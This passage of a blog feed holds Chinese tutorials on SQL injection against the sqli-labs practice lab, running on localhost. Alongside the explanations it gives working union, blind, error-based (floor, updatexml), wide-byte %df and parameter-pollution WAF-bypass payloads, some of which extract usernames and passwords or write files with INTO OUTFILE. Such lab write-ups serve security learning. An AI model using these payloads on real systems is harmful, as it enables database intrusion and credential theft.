服务器请求数据。数据返回 路径则相反,如下图所示。</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215616223-1523539123.png\" alt=\"img\"></p>\n<p>题目上说这个网站受防火墙保护,。WAF (Web 应用防护系统)是通过执行一系列针对 HTTP&#x2F;HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p>\n<p>绕过的方法是 **HPP (HTTP Parameter Pollution)**，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。</p>\n<p>这里我们需要在url前面加上login.php</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215624664-1172501596.png\" alt=\"img\"></p>\n<p>这里说，赶走你这个愚蠢的黑客,我们注入两个id用&amp;连接</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215637833-179834141.png\" alt=\"img\"></p>\n<p>这里正常回显，我们加单引号引起报错</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215644799-1384920112.png\" alt=\"img\"></p>\n<p>这里报错部分可以看出，就是单引号注入，但因为正常情况下没有报错，我们证明一下。</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215650634-460551672.png\" alt=\"img\"></p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215656193-456981476.png\" alt=\"img\"></p>\n<p>因此这里一定是单引号闭合。</p>\n<p>接下来注入方式和第一关相同</p>\n<p>第三十和三十一关分别是双引号和双引号括号闭合，其他没有变化</p>\n<h1 id=\"第三十二题\"><a href=\"#第三十二题\" class=\"headerlink\" title=\"第三十二题\"></a>第三十二题</h1><p>打开这个题可以看到，Please input the ID as parameter with numeric value</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215704019-1537395489.png\" alt=\"img\"></p>\n<p>给他一个id&#x3D;1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215711746-1549407757.png\" alt=\"img\"></p>\n<p>这里可以看到它可以正常回显，我们尝试加单引号引起报错</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215719967-142366351.png\" alt=\"img\"></p>\n<p>这里可以看到Hint: The Query String you input is escaped as : 1’</p>\n<p>我没有输, 但是它自己加上了，这里很容易想到它可能把单引号替换成了斜杠加单引号，这里翻一下源码</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215726369-1679368194.png\" alt=\"img\"></p>\n<p>很明显，代码中利用正则匹配将 [ &#x2F;，’，” ]这些三个符号都过滤掉了</p>\n<p>函数addslashes()作用是返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号(‘)双引号(“)反斜杠()NULL。</p>\n<p>这里想用单引号我们可以用%df，’吃掉‘前面的斜杠</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215731971-592760881.png\" alt=\"img\"></p>\n<p>可以看到这里就引起报错了，可以看到是单引号闭合，接下来可以参考第一关注入</p>\n<h1 id=\"第三十三关\"><a href=\"#第三十三关\" class=\"headerlink\" title=\"第三十三关\"></a>第三十三关</h1><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215737510-820484076.png\" alt=\"img\"></p>\n<p>详见三十二关</p>\n<p>三十五题也一样，是数字型注入 </p>\n<h1 id=\"第三十四关\"><a href=\"#第三十四关\" class=\"headerlink\" title=\"第三十四关\"></a>第三十四关</h1><p>开始post的过滤</p>\n<p>打开这个题发现是一个登录框</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215745122-54304887.png\" alt=\"img\"></p>\n<p>怕麻烦，我这里直接用pb大法。</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215754014-1477647937.png\" alt=\"img\"></p>\n<p>在用户这里加上单引号尝试引起报错</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215800214-840224829.png\" alt=\"img\"></p>\n<p>发现它又有&#x2F;，显然跟上一题一样把单引号替换成单引号斜杠</p>\n<p>尝试用上一题知道的 %df来‘吃掉’斜杠</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215808429-331846514.png\" alt=\"img\"></p>\n<p>报错了，用order by爆一下字段</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215814988-646666121.png\" alt=\"img\"></p>\n<p>可以知道是二字段</p>\n<p>这里尝试爆一下数据库名</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215824034-599705043.png\" alt=\"img\"></p>\n<p>成功了，我们可以正常爆数据</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215829385-1373901654.png\" alt=\"img\"></p>\n<p>这里因为有报错也可以用报错注入</p>\n<p> 到这里进阶篇就结束了</p>\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/30/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/",
            "url": "https://blog.xcu.icu/2022/10/30/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/",
            "title": "基于sqli-labs前20关的SQL注入学习",
            "date_published": "2022-10-29T16:00:00.000Z",
            "content_html": "<h1 id=\"SQL注入基础篇\"><a href=\"#SQL注入基础篇\" class=\"headerlink\" title=\"SQL注入基础篇\"></a>SQL注入基础篇</h1><h2 id=\"一、SQL简介\"><a href=\"#一、SQL简介\" class=\"headerlink\" title=\"一、SQL简介\"></a>一、SQL简介</h2><h2 id=\"SQL是一种查询语言，是一种访问和处理数据库，包括数据插入、查询、更新和删除。\"><a href=\"#SQL是一种查询语言，是一种访问和处理数据库，包括数据插入、查询、更新和删除。\" class=\"headerlink\" title=\"SQL是一种查询语言，是一种访问和处理数据库，包括数据插入、查询、更新和删除。\"></a>SQL是一种查询语言，是一种访问和处理数据库，包括数据插入、查询、更新和删除。</h2><p><strong>具体功能总结如下</strong></p>\n<ul>\n<li>可以对数据库进行查询并取得数据❗</li>\n<li>可以向数据库插入或删除记录❗</li>\n<li>可以建立数据库，表❗</li>\n<li>可以设置表，储存过程和视图的权限❗</li>\n</ul>\n<p>1”||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;’web_sqli’)),0x7e),1)#</p>\n<h1 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h1><h3 id=\"基于sqli-labs靶场\"><a href=\"#基于sqli-labs靶场\" class=\"headerlink\" title=\"(基于sqli-labs靶场)#\"></a>(基于sqli-labs靶场)<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEyODcxNTM2NDM=\">#</span></h3><p><strong>先了解几个简单的语句</strong></p>\n<ul>\n<li>version（）：查看数据库版本</li>\n<li>user（）：查看当前用户</li>\n<li>database（）：查看使用的数据库</li>\n<li>group_concat（）：一次性获取数据库信息</li>\n<li>select 字段名 from 表名</li>\n<li>select的后面表示筛选的内容，from的后面表示筛选内容来自的位置，where的后面表示筛选的条件</li>\n</ul>\n<h2 id=\"1-4关基于错误的字符串-x2F-数字型注入\"><a href=\"#1-4关基于错误的字符串-x2F-数字型注入\" class=\"headerlink\" title=\"1-4关基于错误的字符串&#x2F;数字型注入#\"></a>1-4关基于错误的字符串&#x2F;数字型注入<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM1ODA5MTUzMTk=\">#</span></h2><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314175958063-396558717.png\" alt=\"img\"></h1><p><strong>根据要求看出需要构建一个id参数值</strong></p>\n<p><strong>首先判断是否为数字型注入，像这样输入回显正常</strong></p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9MQ==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</span><br><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180021405-1217770395.png\" alt=\"img\"></strong></p>\n<p><strong>将后面的？id&#x3D;1改为？id&#x3D;1 and 1&#x3D;1–+和？id&#x3D;1 and 1&#x3D;2–+发现回显都正常</strong></p>\n<p><strong>于是判断一下是否为字符型注入，这里改变一下闭合的符号</strong></p>\n<p><strong>像这样输入会报错</strong></p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9MSYjMzk7\">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</span><br><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180026767-94242277.png\" alt=\"img\"></strong></p>\n<p><strong>把报错拿出来分析</strong></p>\n<h1 id=\"ctf赛题没有报错，这里只是靶场练习\"><a href=\"#ctf赛题没有报错，这里只是靶场练习\" class=\"headerlink\" title=\"****ctf赛题没有报错，这里只是靶场练习******\"></a><em>*<em>*</em>**ctf赛题没有报错，这里只是靶场练习*****</em>*</h1><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>\n<p>‘’1’’ LIMIT 0,1’这两个单引号包含部分就是报错部分</p>\n<p>‘1’是数据库中的完整部分，后面多个引号也是在说明属于字符型注入</p>\n<p>像上面一样，将后面的？id&#x3D;1改为？id&#x3D;1 and 1&#x3D;1–+和？id&#x3D;1 and 1&#x3D;2–+发现1&#x3D;1时正常回显而1&#x3D;2时没有回显</p>\n<p>然后使用order by来确定表中的列数，为什么要确定表中字段的列数呢？是因为union联合查询的特点</p>\n<p>union联合查询特点</p>\n<ul>\n<li>要求多条查询语句的查询列数是一致的</li>\n<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>\n</ul>\n<p><strong>于是构造</strong></p>\n<ul>\n<li>?id&#x3D;1’ order by 1–+　　页面回显正常</li>\n<li>?id&#x3D;1’ order by 2–+　　页面回显正常</li>\n<li>?id&#x3D;1’ order by 3–+　　页面回显正常</li>\n<li>?id&#x3D;1’ order by 4–+　　出现报错界面</li>\n</ul>\n<p>篇幅问题我只展示了order by 4的报错这个</p>\n<h1 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180044871-999577020.png\" alt=\"img\"></h1><p>然后就确定了字段数，于是用联合查询</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,2,3 –+](<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,2,3  –+)　</p>\n<p>(将id弄成一个负数的值或者是0，使前面的语句失效)然后看看union查询是否有回显位</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180055404-1406981305.png\" alt=\"img\"></p>\n<p>这样就看到了2，3这两个回显位</p>\n<p>然后利用union查询，查看数据库的版本和数据库名,这里面再补充点知识点</p>\n<ul>\n<li>version():查看数据库版本</li>\n<li>database():查看使用的数据库</li>\n<li>user():查看当前用户</li>\n<li>limit:limit子句分批来获取所有数据</li>\n<li>group_concat():一次性获取所有的数据库信息</li>\n</ul>\n<p>接着利用回显位查询数据库和数据库版本信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,version(),database() –+<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180102576-1024296278.png\" alt=\"img\"></p>\n<p>下一步爆表</p>\n<p>再爆表之前先了解一波知识点：</p>\n<ul>\n<li>information_schema.tables:包含了数据库里所有的表</li>\n<li>table_name:表名</li>\n<li>table_schema:数据库名</li>\n<li>column_name:字段名</li>\n</ul>\n<p>开始爆表</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),database() –+<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180107430-909707208.png\" alt=\"img\"></p>\n<p>查看users这个表上的字段名</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),database() –+<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180113978-662185195.png\" alt=\"img\"></p>\n<p>然后从username和passwor字段上获得信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTEmIzM5Ow==\">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;</span> union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) –+<img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180120428-1817213673.png\" alt=\"img\"></p>\n<p><strong>以上是第一关的教程</strong></p>\n<p>第二关属于数字型注入，开始判断的过程没有那个单引号？id&#x3D;1就可以，后面的步骤相同</p>\n<p>第三关在第一关的基础上加了一个右括号？id&#x3D;1’)即可</p>\n<p>第四关在第三关的基础上将’改为” ？id&#x3D;”)即可</p>\n<h1 id=\"第五—六关\"><a href=\"#第五—六关\" class=\"headerlink\" title=\"第五—六关\"></a>第五—六关</h1><p>关于获取字段的小技巧：我们从后台源码中，一般只要看到 select * from 表名，一般是要猜这个表里的所有字段，然后进行注入，如果是 select username,password from 表名，这种形式的可以直接利用2个字段，作为语句的注入字段。</p>\n<h2 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型#\"></a>判断注入类型<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM3MTY5Mzc0ODY=\">#</span></h2><p>首先<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MQ==\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</span></p>\n<p>出现下面的页面</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164229854-2122047553.png\" alt=\"img\"></p>\n<p>发现这里没有回显为，通常有三种做法：布尔注入、时间延迟注入、报错注入</p>\n<p>先用<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MQ==\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</span> and 1&#x3D;1</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164311519-89001475.png\" alt=\"img\"></p>\n<p>再用<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MQ==\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</span> and 1&#x3D;2</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164342718-2065052248.png\" alt=\"img\"></p>\n<p>发现回显相同，则这里不是数字型注入</p>\n<p>用<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MSVFMiU4MCU5OA==\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1‘</span></p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164411285-576453638.png\" alt=\"img\"></p>\n<p>发现报错所以一定存在注入漏洞</p>\n<p>用<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MSYjMzk7\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</span> and 1&#x3D;1 –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164426650-1606172898.png\" alt=\"img\"></p>\n<p>用<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MSYjMzk7\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</span> and 1&#x3D;2 –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164440263-551091908.png\" alt=\"img\"></p>\n<p>发现两次回显不相同，那么这里应该是字符型注入，单引号闭合</p>\n<h2 id=\"同样用二分法判断字段长度\"><a href=\"#同样用二分法判断字段长度\" class=\"headerlink\" title=\"同样用二分法判断字段长度#\"></a>同样用二分法判断字段长度<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEzMTgwODI5OTE=\">#</span></h2><p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MSYjMzk7\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</span> order by 3–+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164455095-1238823460.png\" alt=\"img\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MSYjMzk7\">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</span> order by 3–+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164507775-1504911268.png\" alt=\"img\"></p>\n<h2 id=\"爆库名长度\"><a href=\"#爆库名长度\" class=\"headerlink\" title=\"爆库名长度#\"></a>爆库名长度<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI1NTQ3OTEyNzc=\">#</span></h2><p>?id&#x3D;1’ and length(database())&#x3D;8 –+时有回显</p>\n<h2 id=\"接下来就是进行数据库名称的爆破：\"><a href=\"#接下来就是进行数据库名称的爆破：\" class=\"headerlink\" title=\"接下来就是进行数据库名称的爆破：#\"></a>接下来就是进行数据库名称的爆破：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQxOTY3MTQ4Mzg=\">#</span></h2><p>?id&#x3D;1’ and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;’a’–+ 通过二分法不断缩小范围。可以不断的爆出出数据库名称</p>\n<h2 id=\"接下来进行数据库下表的爆破：\"><a href=\"#接下来进行数据库下表的爆破：\" class=\"headerlink\" title=\"接下来进行数据库下表的爆破：#\"></a>接下来进行数据库下表的爆破：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2OTcxMzU5Mzg=\">#</span></h2><p>?id&#x3D;1’ and left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1)&#x3D;’e’–+第一张表的第一个字母’e’</p>\n<h2 id=\"接下来继续爆列，得出第二列是用户名，第三列是密码\"><a href=\"#接下来继续爆列，得出第二列是用户名，第三列是密码\" class=\"headerlink\" title=\"接下来继续爆列，得出第二列是用户名，第三列是密码;#\"></a>接下来继续爆列，得出第二列是用户名，第三列是密码;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzIxNTkyMDYxMDY=\">#</span></h2><p>?id&#x3D;1’ and left((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()limit 2,1),8)&#x3D;’password’ –+</p>\n<h6 id=\"以上是盲注的内容这个最好还是程序化的跑脚本比较好，手工注入费时\"><a href=\"#以上是盲注的内容这个最好还是程序化的跑脚本比较好，手工注入费时\" class=\"headerlink\" title=\"以上是盲注的内容这个最好还是程序化的跑脚本比较好，手工注入费时\"></a>以上是盲注的内容这个最好还是程序化的跑脚本比较好，手工注入费时</h6><h2 id=\"floor报错注入的方法\"><a href=\"#floor报错注入的方法\" class=\"headerlink\" title=\"floor报错注入的方法#\"></a>floor报错注入的方法<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzExOTM0NzQ1MDg=\">#</span></h2><h4 id=\"这里先指明几个知识点\"><a href=\"#这里先指明几个知识点\" class=\"headerlink\" title=\"这里先指明几个知识点#\"></a>这里先指明几个知识点<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzgxNzE1NzM0Nw==\">#</span></h4><p>因主键具有唯一性，利用主键重复导致报错，以此提取错误信息。</p>\n<p>as其实就是一个别名的作用</p>\n<p><em>union select 1,count(</em>),concat((注入语句)，floor(rand()*2))as a from information_schema.columns group by a –+</p>\n<p>floor()、rand()、group by语句相结合的报错：</p>\n<p>1、rand()函数：<br>rand()返回0到1的随机数。<br>rand(0)返回一个固定的0到1的伪随机数。</p>\n<p>2、floor()函数：<br>floor(x)返回小于或等于 x 的最大整数。</p>\n<p>3、group by语句：<br>group by语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p>\n<p>详见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vam9rZXItcWkvcC8xNjAxNTYwMS5odG1s\">floor报错注入原理 - Joker-qi - 博客园 (cnblogs.com)</span></p>\n<h2 id=\"开始floor报错注入\"><a href=\"#开始floor报错注入\" class=\"headerlink\" title=\"开始floor报错注入#\"></a>开始floor报错注入<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE5NTMxMDQ0NTc=\">#</span></h2><p>?id&#x3D;1’ union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164529559-915569650.png\" alt=\"img\"></p>\n<p>?id&#x3D;1’ union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164543670-779035287.png\" alt=\"img\"></p>\n<p>?id&#x3D;1’ union select 1,count(*),concat((select password from users limit 2,1),floor(rand(0)*2))as x from information_schema.tables group by x –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164555194-1644339986.png\" alt=\"img\"></p>\n<h2 id=\"updatexml的报错注入\"><a href=\"#updatexml的报错注入\" class=\"headerlink\" title=\"updatexml的报错注入#\"></a>updatexml的报错注入<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM0MjcyOTY3OTM=\">#</span></h2><p><code>?id=1&#39; and updatexml(1,concat(0x5e,database(),0x5e),1) --+</code>,database()处可换成任意SQL语句</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164607182-1580895556.png\" alt=\"img\"></p>\n<p>?id&#x3D;1’ and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) –+</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164620333-577328099.png\" alt=\"img\"></p>\n<p>?id&#x3D;1’ and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) –+</p>\n<p>可将substr函数里的1处依次加31.（因为每次只能查出31为字符）</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164628624-1163760604.png\" alt=\"img\"></p>\n<p>第六题闭合改为双引号即可</p>\n<h1 id=\"第七题\"><a href=\"#第七题\" class=\"headerlink\" title=\"第七题\"></a>第七题</h1><p>这里第七题打开后发现</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164744197-352870918.png\" alt=\"img\"></p>\n<p>这个与之前的不同,这里说明了要使用outfile函数</p>\n<h2 id=\"outfile函数\"><a href=\"#outfile函数\" class=\"headerlink\" title=\"outfile函数#\"></a>outfile函数<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzUzMTQyNjIzMw==\">#</span></h2><p>就是将数据库的查询内容导到一个外部文件</p>\n<p>这里用老办法试出闭合为’））</p>\n<p>用show variables like ‘%secure%’;查看本机数据库的导出目录，如果随便导出到一个文件夹就会报错（secure_file_priv所对于的目录就是可以导出文件的地址）</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164750199-897628126.png\" alt=\"img\"></p>\n<p>?id&#x3D;-1’)) union select 1,database(),user() into outfile”D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt” –+用这个句型可以查询数据</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164758100-228051775.png\" alt=\"img\"></p>\n<p>改动祥见1-4关笔记</p>\n<h1 id=\"第八、九、十关用盲注做祥见less-5；\"><a href=\"#第八、九、十关用盲注做祥见less-5；\" class=\"headerlink\" title=\"第八、九、十关用盲注做祥见less-5；\"></a>第八、九、十关用盲注做祥见less-5；</h1><h1 id=\"第十一、十二关\"><a href=\"#第十一、十二关\" class=\"headerlink\" title=\"第十一、十二关\"></a>第十一、十二关</h1><h2 id=\"打开第十一关发现他有个登录栏\"><a href=\"#打开第十一关发现他有个登录栏\" class=\"headerlink\" title=\"打开第十一关发现他有个登录栏#\"></a>打开第十一关发现他有个登录栏<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEwNzMxMTczNjY=\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164837204-660817188.png\" alt=\"img\"></p>\n<h2 id=\"首先尝试用弱口令登录\"><a href=\"#首先尝试用弱口令登录\" class=\"headerlink\" title=\"首先尝试用弱口令登录#\"></a>首先尝试用弱口令登录<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQwNjkxNjY2NDE=\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164846113-1022473245.png\" alt=\"img\"></p>\n<p>登录成功</p>\n<h2 id=\"输入单引号引起报错\"><a href=\"#输入单引号引起报错\" class=\"headerlink\" title=\"输入单引号引起报错#\"></a>输入单引号引起报错<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2NDI1MDAxNTY=\">#</span></h2><p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164852147-470458620.png\" alt=\"img\"></p>\n<p>这个是属于单引号闭合；</p>\n<h2 id=\"用二分法得列数\"><a href=\"#用二分法得列数\" class=\"headerlink\" title=\"用二分法得列数#\"></a>用二分法得列数<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE0NDA0MDk4MTU=\">#</span></h2><p>‘ order by 1#</p>\n<p><img data-src=\"https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164859647-768346677.png\" alt=\"img\"></p>\n<p>这里将数字一逐个加一直到回显改变</p>\n<p><img 